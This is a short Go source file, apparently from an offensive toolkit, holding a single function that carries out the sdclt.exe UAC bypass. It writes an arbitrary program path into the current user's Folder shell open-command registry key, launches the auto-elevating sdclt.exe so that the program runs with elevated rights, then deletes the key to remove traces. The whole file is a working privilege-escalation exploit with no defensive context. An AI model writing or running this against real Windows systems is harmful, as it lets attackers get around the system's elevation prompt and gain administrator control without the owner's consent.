package models

import (
	"fmt"
	"time"

	"golang.org/x/sys/windows/registry"
)

//Need Administrator(full control)
func Sdclt_registry(File_path string) {
	fmt.Println(Version())
	subkey, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\Folder\Shell\open\command`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Printf("[-] CreateKey err: %v", err)
		return
	}
	subkey.SetStringValue("", File_path)
	subkey.SetStringValue("DelegateExecute", "")
	subkey.Close()
	WindowsRun("C:\\windows\\system32\\sdclt.exe")
	time.Sleep(time.Second * 3)
	DeleteSubKeyTree("Folder")
	fmt.Println("[+] Sd Done")
}
